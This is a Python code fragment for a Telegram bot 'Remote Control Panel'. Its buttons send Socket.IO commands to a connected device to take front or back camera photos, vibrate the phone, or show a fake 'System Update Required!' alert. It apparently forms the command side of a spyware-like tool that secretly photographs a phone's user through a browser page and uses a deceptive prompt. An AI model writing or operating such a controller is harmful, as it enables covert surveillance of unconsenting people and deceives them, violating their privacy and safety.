# --- Telegram Bot Logic ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Save context
    latest_telegram_context['update'] = update
    latest_telegram_context['context'] = context
    latest_telegram_context['loop'] = asyncio.get_event_loop()

    keyboard = [
        [InlineKeyboardButton("Capture Front 📸", callback_data='user'), InlineKeyboardButton("Capture Back 📸", callback_data='environment')],
        [InlineKeyboardButton("Vibrate Phone 📳", callback_data='vibrate')],
        [InlineKeyboardButton("Show Alert ⚠️", callback_data='alert')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('🎮 *Remote Control Panel*', reply_markup=reply_markup, parse_mode='Markdown')

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    # Update context
    latest_telegram_context['update'] = update
    latest_telegram_context['context'] = context
    latest_telegram_context['loop'] = asyncio.get_event_loop()

    action = query.data
    
    if action in ['user', 'environment']:
        await query.edit_message_text(text=f"⏳ Requesting {action} camera photo...")
        socketio.emit('request_capture', {'camera': action})
    elif action == 'vibrate':
        await query.edit_message_text(text="📳 Sending vibration command...")
        socketio.emit('request_vibrate', {'pattern': 1000})
    elif action == 'alert':
        socketio.emit('request_alert', {'message': "System Update Required!"})
        await query.edit_message_text(text="⚠️ Alert message sent to device.")

